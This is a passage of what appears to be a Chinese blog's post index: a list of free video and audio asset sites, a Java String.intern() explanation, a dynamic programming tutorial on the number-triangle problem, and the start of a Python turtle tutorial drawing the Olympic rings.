src="http://static.luozhinet.com/1a/521034b3b321c9092d3ae689f51b3c">​</p><p><img src="http://static.luozhinet.com/91/3c28c130673fd867a98b488baed2bb" title="点击并拖拽以移动"></p><p><strong>2、Pexels</strong></p><p><a href="https://www.pexels.com/zh-cn/" title="https://www.pexels.com/zh-cn/">https://www.pexels.com/zh-cn/</a></p><p>这是一个国外素材网站，主要以图片、视频素材为主，这里面的视频全部都是高清无水印，还可以免费下载。你还可以发挥创造力，随心所欲地编辑图片和视频。</p><p><img src="http://static.luozhinet.com/10/177f1c8bcc8cd8576fabb20c611fe8">​</p><p><img src="http://static.luozhinet.com/91/3c28c130673fd867a98b488baed2bb" title="点击并拖拽以移动"></p><p><strong>3、 Pixabay</strong></p><p><a href="https://pixabay.com/" title="https://pixabay.com/">https://pixabay.com/</a></p><p>跟Pexels同样是以图片、视频素材为主，网站内所有视频都是4K高清无水印，而且还提供免费下载，可用于商业用途。</p><p><img src="http://static.luozhinet.com/c8/beb29f3c6665b30c27a14bd421412b">​</p><p><img src="http://static.luozhinet.com/91/3c28c130673fd867a98b488baed2bb" title="点击并拖拽以移动"></p><p><strong>4、mazwai</strong></p><p><a href="https://mazwai.com/" title="https://mazwai.com/">https://mazwai.com/</a></p><p>这是一个纯视频素材网站，超多航拍风景视频素材，有人物、自然、交通、景观等等，分类很清晰。全部都是4K、1080P清晰度没得说，还可免费下载，用于商业用途。</p><p><img src="http://static.luozhinet.com/3d/91d8b39010918ccc8bd3cf409f0ae1">​</p><p><img src="http://static.luozhinet.com/91/3c28c130673fd867a98b488baed2bb" title="点击并拖拽以移动"></p><p><strong>5、爱给网</strong></p><p><a href="https://www.aigei.com/" title="https://www.aigei.com/">https://www.aigei.com/</a></p><p>爱给网是国内比较大的一个音频素材网站，这里面一共有117万首音效，全部一一做好了分类。基本都能免费下载，但是商用需要购买版权。</p><p><img src="http://static.luozhinet.com/c3/2eea92a7a2612d177ac68dc7c1b79f">​</p><p><img src="http://static.luozhinet.com/91/3c28c130673fd867a98b488baed2bb" title="点击并拖拽以移动"></p><p><strong>6、Jamendo Music</strong></p><p><a href="https://www.jamendo.com/start" title="https://www.jamendo.com/start">https://www.jamendo.com/start</a></p><p>国外的一个音频素材网站，这里面有超多背景音乐素材，安静的、欢快的、紧张、恐怖的背景音乐这里面都能找到，而且全部提供免费下载，还有很多免版税的素材，非常nice。</p><p><img src="http://static.luozhinet.com/e7/d38d6254210a4e38381186627d96cd">​</p><p><img src="http://static.luozhinet.com/91/3c28c130673fd867a98b488baed2bb" title="点击并拖拽以移动"></p><p>以上这6个视频、音频素材网站，都是我本人亲测好用！</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 素材 </tag>
            
            <tag> 视频 </tag>
            
            <tag> 下载 </tag>
            
            <tag> 音频 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>串池StringTable与s.intern()方法 、 验证s.intern()方法（基于jdk1.8）（附1.6对比）</title>
      <link href="/posts/8852c858e001/"/>
      <url>/posts/8852c858e001/</url>
      
        <content type="html"><![CDATA[<h2 id="验证s-intern-方法（基于jdk1-8）（附1-6对比）"><a href="#验证s-intern-方法（基于jdk1-8）（附1-6对比）" class="headerlink" title="验证s.intern()方法（基于jdk1.8）（附1.6对比）"></a>验证s.intern()方法（基于jdk1.8）（附1.6对比）</h2><h4 id="1、在-jdk1-8中-s-intern-方法指的是尝试将字符串对象s放入串池中-：如果串池中有，则不会放入；若没有，放入（和堆中为同一对象）。"><a href="#1、在-jdk1-8中-s-intern-方法指的是尝试将字符串对象s放入串池中-：如果串池中有，则不会放入；若没有，放入（和堆中为同一对象）。" class="headerlink" title="1、在 jdk1.8中 s.intern()方法指的是尝试将字符串对象s放入串池中 ：如果串池中有，则不会放入；若没有，放入（和堆中为同一对象）。"></a>1、在 jdk1.8中 s.intern()方法指的是尝试将字符串对象s放入串池中 ：如果串池中有，则不会放入；若没有，放入（和堆中为同一对象）。</h4><ul><li><h5 id="最终返回的是串池中的对象（不论放不放入）"><a href="#最终返回的是串池中的对象（不论放不放入）" class="headerlink" title="最终返回的是串池中的对象（不论放不放入）"></a>最终返回的是串池中的对象（不论放不放入）</h5></li><li><h5 id="如：String-s1-x3D-s-intern-s1指的是串池中的常量对象"><a href="#如：String-s1-x3D-s-intern-s1指的是串池中的常量对象" class="headerlink" title="如：String s1 &#x3D; s.intern(); s1指的是串池中的常量对象"></a>如：String s1 &#x3D; s.intern(); <strong>s1指的是串池中的常量对象</strong></h5></li></ul><h4 id="2、下面是两个测试横向对比（1-8环境）："><a href="#2、下面是两个测试横向对比（1-8环境）：" class="headerlink" title="2、下面是两个测试横向对比（1.8环境）："></a>2、下面是两个测试横向对比（1.8环境）：</h4><h5 id="两个方法不同之处："><a href="#两个方法不同之处：" class="headerlink" title="两个方法不同之处："></a>两个方法不同之处：</h5><ul><li><h5 id="主要在执行String-s1-x3D-s-intern-前后，具体看下面测试方法的注释"><a href="#主要在执行String-s1-x3D-s-intern-前后，具体看下面测试方法的注释" class="headerlink" title="主要在执行String s1 &#x3D; s.intern() 前后，具体看下面测试方法的注释"></a>主要在执行String s1 &#x3D; s.intern() 前后，具体看下面测试方法的注释</h5></li><li><h5 id="导致两个方法中最后一行System-out-println-“ab”-x3D-x3D-s-输出不同"><a href="#导致两个方法中最后一行System-out-println-“ab”-x3D-x3D-s-输出不同" class="headerlink" title="导致两个方法中最后一行System.out.println(“ab” &#x3D;&#x3D; s) 输出不同"></a>导致两个方法中最后一行System.out.println(“ab” &#x3D;&#x3D; s) 输出不同</h5></li></ul><h6 id="测试一：执行String-s1-x3D-s-intern-前放入”ab”"><a href="#测试一：执行String-s1-x3D-s-intern-前放入”ab”" class="headerlink" title="测试一：执行String s1 &#x3D; s.intern() 前放入”ab”"></a>测试一：执行String s1 &#x3D; s.intern() 前放入”ab”</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终串池中对象StringTable[&quot;a&quot;, &quot;b&quot;, &quot;ab&quot; ]</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//vm调用StringBuild.append(&quot;a&quot;).append(&quot;b&quot;).toString() 最终相当于变成 new String(&quot;ab&quot;)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>) + <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//*****线程此时串池中对象StringTable[&quot;a&quot;, &quot;b&quot;]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//堆内存： new String(&quot;a&quot;)   new String(&quot;b&quot;)   new String(&quot;ab&quot;)</span></span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;ab&quot;</span> == s);  <span class="comment">//false  串池中没有&quot;ab&quot;,此次会将 &quot;ab&quot;常量放入串池 因为 s在堆内存中，&quot;ab&quot;在串池中内存地址不同</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//****此时串池中对象StringTable[&quot;a&quot;, &quot;b&quot;, &quot;ab&quot;]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//s.intern尝试将字符串对象s放入串池中 ：如果串池中有，则不会放入；若没有，放入, 最终会返回串池中的对象</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> s.intern();  <span class="comment">//不会放入s，因为串池中已经存在 &quot;ab&quot;</span></span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;ab&quot;</span> == s1);  <span class="comment">//true   都是串池中的常量对象 ab</span></span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;ab&quot;</span> == s);  <span class="comment">//false   s为堆内存地址 &quot;ab&quot;为串池中</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="测试二：执行String-s1-x3D-s-intern-后放入”ab”"><a href="#测试二：执行String-s1-x3D-s-intern-后放入”ab”" class="headerlink" title="测试二：执行String s1 &#x3D; s.intern() 后放入”ab”"></a>测试二：执行String s1 &#x3D; s.intern() 后放入”ab”</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终串池中对象StringTable[&quot;a&quot;, &quot;b&quot;, &quot;ab&quot; ]</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//vm调用StringBuild.append(&quot;a&quot;).append(&quot;b&quot;).toString() 最终相当于变成 new String(&quot;ab&quot;)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>) + <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;b&quot;</span>);  <span class="comment">//简化等同于  String s = new String(&quot;ab&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//*****线程此时串池中对象StringTable[&quot;a&quot;, &quot;b&quot;]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//堆内存： new String(&quot;a&quot;)   new String(&quot;b&quot;)   new String(&quot;ab&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//s.intern尝试将字符串对象s放入串池中 ：如果串池中有，则不会放入；若没有，放入, 最终会返回串池中的对象</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> s.intern();  <span class="comment">//放入s，因为串池中不存在 &quot;ab&quot; 之前代码行中未出现常量 &quot;ab&quot;</span></span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;ab&quot;</span> == s1);  <span class="comment">//true   都是串池中的常量对象 ab</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//****此时串池中对象StringTable[&quot;a&quot;, &quot;b&quot;, &quot;ab&quot;]</span></span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;ab&quot;</span> == s);   <span class="comment">//true   s、&quot;ab&quot;为串池中同一个常量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、附：在-jdk1-6中-s-intern-方法指的是尝试将字符串对象s放入串池中-：如果串池中有，则不会放入；若没有，放入时为拷贝一份s对象放入"><a href="#3、附：在-jdk1-6中-s-intern-方法指的是尝试将字符串对象s放入串池中-：如果串池中有，则不会放入；若没有，放入时为拷贝一份s对象放入" class="headerlink" title="3、附：在 jdk1.6中 s.intern()方法指的是尝试将字符串对象s放入串池中 ：如果串池中有，则不会放入；若没有，放入时为拷贝一份s对象放入"></a>3、附：在 jdk1.6中 s.intern()方法指的是尝试将字符串对象s放入串池中 ：如果串池中有，则不会放入；若没有，放入时为拷贝一份s对象放入</h4><h5 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终串池中对象StringTable[&quot;a&quot;, &quot;b&quot;, &quot;ab&quot; ]</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>) + <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//*****线程此时串池中对象StringTable[&quot;a&quot;, &quot;b&quot;]</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> s.intern();  <span class="comment">//拷贝一份s对象放入</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//*****线程此时串池中对象StringTable[&quot;a&quot;, &quot;b&quot;, &quot;ab&quot;]</span></span><br><span class="line">    </span><br><span class="line">    System.out.println(<span class="string">&quot;ab&quot;</span> == s1);  <span class="comment">//true   都是串池中的常量对象 ab</span></span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;ab&quot;</span> == s);   <span class="comment">//false   s为堆内存地址 &quot;ab&quot;为串池中对象</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结："><a href="#总结：" class="headerlink" title="# 总结："></a># 总结：</h4><ul><li><h5 id="1-6将常量对象放入常量池时拷贝，最终堆中和常量池中对象不同"><a href="#1-6将常量对象放入常量池时拷贝，最终堆中和常量池中对象不同" class="headerlink" title="1.6将常量对象放入常量池时拷贝，最终堆中和常量池中对象不同"></a>1.6将常量对象放入常量池时拷贝，最终堆中和常量池中对象不同</h5></li><li><h5 id="1-8将常量对象放入常量池时直接将堆内存中对象放入，最终堆中和常量池中对象为同一个"><a href="#1-8将常量对象放入常量池时直接将堆内存中对象放入，最终堆中和常量池中对象为同一个" class="headerlink" title="1.8将常量对象放入常量池时直接将堆内存中对象放入，最终堆中和常量池中对象为同一个"></a>1.8将常量对象放入常量池时直接将堆内存中对象放入，最终堆中和常量池中对象为同一个</h5></li></ul><p><img src="http://static.luozhinet.com/6e/1ed08ace1ca5d199ef0ed50cdc5b6a"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 对象 </tag>
            
            <tag> int </tag>
            
            <tag> new </tag>
            
            <tag> string </tag>
            
            <tag> tern </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ACM程序设计】动态规划 第一篇 引入</title>
      <link href="/posts/1295ca64a467/"/>
      <url>/posts/1295ca64a467/</url>
      
        <content type="html"><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p>[P1216 <a href="https://www.luogu.com.cn/problem/P1216">USACO1.5][IOI1994]数字三角形 Number Triangles - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p><p><strong>题目描述</strong></p><p>观察下面的数字金字塔。</p><p>写一个程序来查找从最高点到底部任意处结束的路径，使路径经过数字的和最大。每一步可以走到左下方的点也可以到达右下方的点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        <span class="number">7</span> </span><br><span class="line">      <span class="number">3</span>   <span class="number">8</span> </span><br><span class="line">    <span class="number">8</span>   <span class="number">1</span>   <span class="number">0</span> </span><br><span class="line">  <span class="number">2</span>   <span class="number">7</span>   <span class="number">4</span>   <span class="number">4</span> </span><br><span class="line"><span class="number">4</span>   <span class="number">5</span>   <span class="number">2</span>   <span class="number">6</span>   <span class="number">5</span> </span><br></pre></td></tr></table></figure><p>在上面的样例中，从 7→3→8→7→5 的路径产生了最大</p><p><strong>输入格式</strong></p><p>第一个行一个正整数 <em>r</em> ,表示行的数目。</p><p>后面每行为这个数字金字塔特定行包含的整数。</p><p><strong>输出格式</strong></p><p>单独的一行,包含那个可能得到的最大的和。</p><p><strong>输入输出样例</strong></p><p><strong>输入 #1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">7</span><br><span class="line">3 8</span><br><span class="line">8 1 0</span><br><span class="line">2 7 4 4</span><br><span class="line">4 5 2 6 5 </span><br></pre></td></tr></table></figure><p><strong>输出 #1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30</span><br></pre></td></tr></table></figure><p><strong>说明&#x2F;提示</strong></p><p>【数据范围】<br>对于 100% 的数据，1≤ r ≤1000，所有输入在 [0,100] 范围内。</p><p>因为题目的样例用贪心就能过,所以将样例稍作改编</p><p><strong>输入 #2</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">7</span><br><span class="line">3 8</span><br><span class="line">8 1 0</span><br><span class="line">2 4 4 7</span><br><span class="line">4 5 2 6 5</span><br></pre></td></tr></table></figure><p><strong>输出 #2</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">28</span><br></pre></td></tr></table></figure><p><img src="http://static.luozhinet.com/09/36ddbc193085df24f5aaf5a5cfe547"></p><ul><li>我们大部分人看到这道题脑海中都会浮现这样的想法，是不是只要每步走的都是两个点中较大的那个值，最后的答案就是最大的。就像这样：7-&gt;8-&gt;1-&gt;4-&gt;6</li><li>我们会发现在第四步的时候情况不对，这里两个子节点相同,明显取右侧的4比左侧的4结果要大，可是当程序执行到这一步，我们要如何使计算机明白要选择右边的结点而不是左边的。</li></ul><h2 id="贪心策略"><a href="#贪心策略" class="headerlink" title="贪心策略"></a>贪心策略</h2><p>这种做法其实是一种贪心的思想,来看它的定义：</p><ul><li>贪心算法（又称贪婪算法）是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，<strong>不从整体最优</strong>上加以考虑，算法得到的是在某种意义上的<strong>局部最优解</strong>。</li></ul><p>我们会发现,即使在第四步选择了右边这个点,结果(7-&gt;8-&gt;1-&gt;4-&gt;6&#x3D;26)比题目给出的答案7-&gt;8-&gt;0-&gt;7-&gt;6总和为28小.即题目在第三层就选择了小的0而不是1。</p><p>正是因为我们每次选择的时候只考虑当前的物品而没有考虑后面的物品,而产生的决策错误.</p><p>因此我们可以知道贪心策略的限制条件，<strong>每次选择局部最优解的时候，一定要保证局部最优策略不会对后续决策产生影响</strong>，如此才能使用贪心策略。</p><p><img src="http://static.luozhinet.com/be/87566013cda9c80a87773c67aef0a5"></p><h2 id="搜索算法"><a href="#搜索算法" class="headerlink" title="搜索算法"></a>搜索算法</h2><p>我们再来考虑一种方法,既然贪心行不通,我们不妨考虑通过搜索来获得它所有的结果.</p><p><img src="http://static.luozhinet.com/be/87566013cda9c80a87773c67aef0a5"></p><p><img src="http://static.luozhinet.com/ee/f39faf7f8e01e90e1397dd545c6bcb"></p><p>然而，会发现：在每一层每个结点都有两种选择,选择左下或者右下，那么数字三角形有 2n-1条路线,我们既需要O(2n-1)的时间,又需要2n-1的空间，如果不进行剪枝当层数很大的时候这是行不通的。</p><p>我们考虑一下能不能把搜索优化。</p><p>首先,回到刚才那个想法，在第 4 层 4 和 4 相同的情况下到底计算机应该选择哪一个。此时，我们可以考虑让计算机分别对这两个结点进行搜索，搜索完再返回大的值，即我们要选择的结点。</p><p>接着，我们想这种想法可不可以在两个结点不相同的时候也使用。于是就有了我们从第一个结点开始，往下先对3和8进行搜索，3和8再分别对自己的子节点搜索…………搜索完后逐层向上返回最大值，这样使得计算机在每次决策的时候选择的都是最优的。</p><p><img src="http://static.luozhinet.com/be/87566013cda9c80a87773c67aef0a5"></p><p><img src="http://static.luozhinet.com/8e/003684609676708cf978414e21731c"></p><p>可惜,我们会发现,这个时间复杂度还是O(2^n-1)，因为还是每个结点要对底下的两结点搜索。</p><p><strong>NOT GIVE UP</strong></p><p>我们反思一下刚才的递归算法</p><p>我们先把图简化，我们看第三层，是不是(2,1)和(2,2)均要执行一次solve(3,2)这个函数，即(3,2)这个点将要被执行两次。</p><p><img src="http://static.luozhinet.com/a1/5144aebaf67aabeab4729bc835caf2"></p><p>可能我们会认为，重复算一两个数影响不大，但是,我们以此类推，会发现(3,2)的子节点也会被搜索多次，这样，当层数很多时重复搜索的次数会很多，导致了时间的浪费(这就是—–<strong>重叠子问题</strong>)</p><p>我们想想，有什么方法可以防止重复搜索。</p><ul><li>a：当然是把它记下来！</li></ul><p>我们考虑用一个二维数组 d[ i ][ j ] 来记录这个递归的返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">solve</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">    d[i][j]=a[i][j]+(i==layer?<span class="number">0</span>:max(solve(i+<span class="number">1</span>,j),solve(i+<span class="number">1</span>,j+<span class="number">1</span>)));</span><br><span class="line">    <span class="keyword">return</span> d[i][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记录好了，应该如何让计算机明白“已经计算过了,不用再计算了”?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">solve</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(d[i][j]&gt;=<span class="number">0</span>) <span class="keyword">return</span> d[i][j];</span><br><span class="line">    d[i][j]=a[i][j]+(i==layer?<span class="number">0</span>:max(solve(i+<span class="number">1</span>,j),solve(i+<span class="number">1</span>,j+<span class="number">1</span>)));</span><br><span class="line">    <span class="keyword">return</span> d[i][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 d[i][j] &#x3D;&#x3D; 0 时表示已经计算过了，如果 d 数组初值为 0，每次搜索都会直接返回，所以我们还需要给d数组赋上初值，即在int main()函数中加入这样一句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(d,<span class="number">-1</span>,<span class="keyword">sizeof</span> d);</span><br></pre></td></tr></table></figure><p><img src="http://static.luozhinet.com/53/c5171c92decbe6c18e03fcf91a799a"></p><p>这就是<strong>记忆化搜索</strong></p><p>由于我们储存了每个结点递归的返回值，我们可以保证每个结点只被递归计算一次。所以时间复杂度是O(n2)，从2n~n2这是一个巨大的优化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">solve</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(d[i][j]&gt;=<span class="number">0</span>) <span class="keyword">return</span> d[i][j];</span><br><span class="line">    d[i][j]=a[i][j]+(i==layer?<span class="number">0</span>:max(solve(i+<span class="number">1</span>,j),solve(i+<span class="number">1</span>,j+<span class="number">1</span>)));</span><br><span class="line">    <span class="keyword">return</span> d[i][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来考虑d(i,j)这个数组的意义，可以发现d(i,j)表示这个位置出发能得到的最大和(包括本身)。</p><p>我们把d(i,j)当成一个函数，那么原问题就可以是求解d(1,1)这个值，即代入下面这个数学函数。</p><p><img src="http://static.luozhinet.com/69/7f84714c4df1860ac9595432fda449"></p><p>这样,我们就引出了今天的主角—–<strong>动态规划</strong></p><p>什么是动态规划？</p><ul><li>动态规划(dynamic programming)是运筹学的一个分支，是求解决策过程(decision process)最优化的数学方法。20世纪50年代初美国数学家R.E.Bellman等人在研究多阶段决策过程(multistep decision process)的优化问题时，提出了著名的最优化原理(principle of optimality)，把多阶段过程转化为一系列单阶段问题，利用各阶段之间的关系，逐个求解，创立了解决这类过程优化问题的新方法——动态规划。1957年出版了他的名著《Dynamic Programming》，这是该领域的第一本著作。——–百度百科</li></ul><p>简单来说，dp是具有递推形式的记忆化搜索，其核心思路是将大问题转化为可以重复被调用最优解的子问题并最终递推出题目整体最优解。</p><p>在动态规划的概念里，我们把d(i,j)定义为一个”状态”，而这个方程就是所谓的”状态转移方程”。</p><p>而这个状态体现的从 ( i , j ) 出发的最大总和，正是”最优子结构”，即”全局最优解包含局部最优解”，这就有效解决了贪心算法中(局部最优解不一定是整体最优解)的问题。</p><p>在上面的记忆化搜索中，我们求解的方式是从方程左边到方程右边，而动态规划正相反，从右边推出左边。</p><p><img src="http://static.luozhinet.com/69/7f84714c4df1860ac9595432fda449"></p><p>最后呈现的正是计算机决策的路径。这一方法被我们称为”递推”。</p><p><a href="https://imgtu.com/i/O3Z3KU"><img src="http://static.luozhinet.com/f6/2e44576a27675c3115aa3ba7a090b2" alt="O3Z3KU.png"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>动态规划的要素：1.初始状态 2.递推关系公式</p><p>动态规划的特征：1.最优子结构 2.无后效性 3.重复子问题</p><p>最优子结构：问题的最优解包含子问题的最优解</p><p>无后效性：某阶段状态只关心前面阶段的状态值。一旦确定，就不受之后阶段的决策影响。</p><p>重复子问题： 不同的决策序列，到达某个相同的阶段时，可能会产生重复的状态。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 搜索 </tag>
            
            <tag> int </tag>
            
            <tag> 整数 </tag>
            
            <tag> solve </tag>
            
            <tag> 结点 </tag>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python中最简单的turtle绘图：奥运五环</title>
      <link href="/posts/7abc2d13da69/"/>
      <url>/posts/7abc2d13da69/</url>
      
        <content type="html"><![CDATA[<p>为什么说奥运五环的绘制是最简单的，实际上它的绘制过程就是通过画笔画出五个相同大小的圆圈即可。不同的是圆圈的位置不同的。</p><p>开始之前，我特地去找了turtle的官网地址贴在下面，其实学习一个技术点官网的作用还是非常重要的。毕竟你在网上找到大量的资料都是二手资料。</p><p>因此，你可能并不了解这个技术点产生的初衷，最后，一个技术点就成以讹传讹。所以，鼓励大家学习一个技术点一定要看看官网的说明，其他地方的二手资料就是用来了解的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.python.org/zh-cn/<span class="number">3</span>/library/tle.html</span><br></pre></td></tr></table></figure><p><img src="http://static.luozhinet.com/96/fd32e014d12cb1c61c93b3b075d594" alt="file"></p><p>使用的非标准库还是turtle，因为它在绘画中的作用还是相当重要的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> tle</span><br></pre></td></tr></table></figure><p>编写一个函数来初始化turtle画笔的一些全局参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    tle.pensize(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br></pre></td></tr></table></figure><p>这次我们用到的全局参数比较单一，只是设置了一下画笔的宽度。</p><p>下面编写一个函数来绘制圆圈，由于五个圆圈的大小都是一样的，这就产生了共性，所以可以使用一个函数来编写圆圈的绘制过程即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">draw_cricle</span>(<span class="params">circle_size=<span class="number">100</span>,x=-<span class="number">250</span>,y=-<span class="number">30</span>,color=<span class="string">&#x27;blue&#x27;</span></span>):</span><br><span class="line">    tle.penup()</span><br><span class="line">    tle.goto(x, y)</span><br><span class="line">    tle.pendown()</span><br><span class="line">    tle.color(color)</span><br><span class="line">    tle.circle(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>调用圆圈绘制函数绘制五个不同颜色的圆环，最终生成了奥运五环的形状。</p><figure 